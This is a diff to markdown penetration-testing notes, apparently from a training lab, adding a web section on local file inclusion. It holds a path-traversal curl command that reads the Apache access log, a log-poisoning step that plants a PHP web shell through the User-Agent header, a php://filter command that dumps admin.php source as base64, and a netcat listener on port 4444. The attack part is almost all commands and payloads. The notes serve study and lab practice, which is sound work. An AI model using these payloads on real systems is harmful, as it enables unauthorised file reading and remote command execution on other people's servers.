@@ -9,7 +9,34 @@
 
 ```$ nc -nvlp 4444```
 
-## SQL Manual Executeion
+
+# Web
+
+## Local File Inclusion
+
+* Attempt to read the access log ->
+```curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log```
+
+### Log poisoning
+
+* Does the applicatoin write to the log? Maybe add a php web shell to your headers...
+ ```User-Agnet Mozilla/5.0 <?php echo system($_GET['cmd']); ?>```
+
+### PHP Wrappers
+
+Gives the ability to read files... even php files. 
+
+```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```
+
+Will yield this... which decoded is the php code
+
+```
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+```
+
+## SQL Injection
 
 ### Connect and Nav
 
